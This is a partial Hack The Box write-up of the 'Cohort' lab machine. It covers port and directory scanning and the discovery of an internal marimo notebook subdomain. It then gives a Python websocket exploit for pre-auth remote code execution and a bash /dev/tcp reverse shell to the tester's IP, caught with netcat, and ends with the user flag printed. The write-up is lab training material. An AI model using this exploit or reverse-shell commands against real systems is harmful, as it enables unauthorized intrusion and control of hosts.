---
title: "Cohort"
kind: writeup
tags:
  - hack-the-box-labs
  - status/in-progress
  - writeup
  - linux
status: "In progress"
difficulty: "Easy"
date: 2026-08-08
url: "https://app.hackthebox.com/machines/Cohort?sort_by=created_at&sort_type=desc"
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: 3b6759b9275180d0b980d1c4e9dd99b3
---

# Cohort

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Nmap Scan

```python
┌──(exp10i73r㉿kali)-[~]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap/Cohort 10.129.6.55                                          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 18:41 +0530
Nmap scan report for 10.129.6.55
Host is up (0.79s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.55 seconds

```

### Fuzzing Directories

```python
┌──(exp10i73r㉿kali)-[~]
└─$ ffuf -u https://cohort.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r -c -fw 61

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://cohort.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 61
________________________________________________

api                     [Status: 405, Size: 47, Words: 6, Lines: 1, Duration: 538ms]
assets                  [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 462ms]
status                  [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 429ms]
:: Progress: [20481/20481] :: Job [1/1] :: 73 req/sec :: Duration: [0:04:06] :: Errors: 0 ::
                                                                                              
```

### Fuzzed subdomains, api, etc, got nothing

![[attachments/Hack The Box Labs/Hack The Box/Cohort/Screenshot_2026-08-08_at_19-06-32.png]]

![[attachments/Hack The Box Labs/Hack The Box/Cohort/Screenshot_2026-08-08_at_19-08-40.png]]

![[attachments/Hack The Box Labs/Hack The Box/Cohort/Screenshot_2026-08-08_at_19-09-24.png]]

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {
      "name": "marketing",
      "host": "cohort.htb",
      "root": "/var/www/cohort"
    },
    {
      "name": "insights-api",
      "host": "cohort.htb",
      "path": "/api/",
      "target": "127.0.0.1:5000"
    },
    {
      "name": "notebooks",
      "host": "nb-1be3782a8afd3ad5.cohort.htb",
      "target": "127.0.0.1:8888",
      "note": "internal analyst workspace, not for external use"
    }
  ]
}
```

### Added the subdomain in the /etc/hosts

```json
┌──(exp10i73r㉿kali)-[~]
└─$ echo "10.129.6.55 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
[sudo] password for exp10i73r: 
10.129.6.55 nb-1be3782a8afd3ad5.cohort.htb
```

![[attachments/Hack The Box Labs/Hack The Box/Cohort/Screenshot_2026-08-08_at_19-12-28.png]]

### The marimo was vulnerable to pre auth RCE

![[attachments/Hack The Box Labs/Hack The Box/Cohort/Screenshot_2026-08-08_at_19-13-55.png]]

### Created a exploit to achieve RCE

```json
cat > marimo_exploit.py << 'EOF'
#!/usr/bin/env python3
import websocket
import ssl
import time
import sys

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = "nb-1be3782a8afd3ad5.cohort.htb"
cmd = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else "id"

try:
    # Connect with SSL disabled
    ws = websocket.WebSocket()
    ws.connect(
        f'wss://{target}/terminal/ws',
        sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False}
    )
    time.sleep(2)
    
    # Clear initial output
    try:
        while True:
            ws.settimeout(0.5)
            ws.recv()
    except:
        pass
    
    # Send command
    ws.send(cmd + '\n')
    time.sleep(2)
    
    # Get result
    output = ""
    while True:
        try:
            ws.settimeout(1)
            output += ws.recv()
        except:
            break
    
    print(output.strip() if output else "Command executed (no output)")
    ws.close()
    
except Exception as e:
    print(f"Exploit failed: {e}")
EOF

chmod +x marimo_exploit.py
```

### Ran the reverse shell command

```json
┌──(exp10i73r㉿kali)-[~]
└─$ python3 marimo-poc.py "bash -c 'bash -i >& /dev/tcp/10.10.16.225/4444 0>&1'"
bash -c 'bash -i >& /dev/tcp/10.10.16.225/4444 0>&1'

# all the reverse shell command were not working then used this

┌──(exp10i73r㉿kali)-[~]
└─$ # Start a screen session
python3 marimo-poc.py "screen -dm bash -c 'bash -i >& /dev/tcp/10.10.16.225/4444 0>&1'"

──(exp10i73r㉿kali)-[~]
└─$ nc -nlvp 4444                                                         
listening on [any] 4444 ...
connect to [10.10.16.225] from (UNKNOWN) [10.129.6.55] 43264
marimo@cohort:~$                                                                                                                                          

```

## User Flag

```json
marimo@cohort:~$ ls
notebooks  user.txt
marimo@cohort:~$ cat user.txt 
292edcc96f0dab2131a5f03614dbae37
```
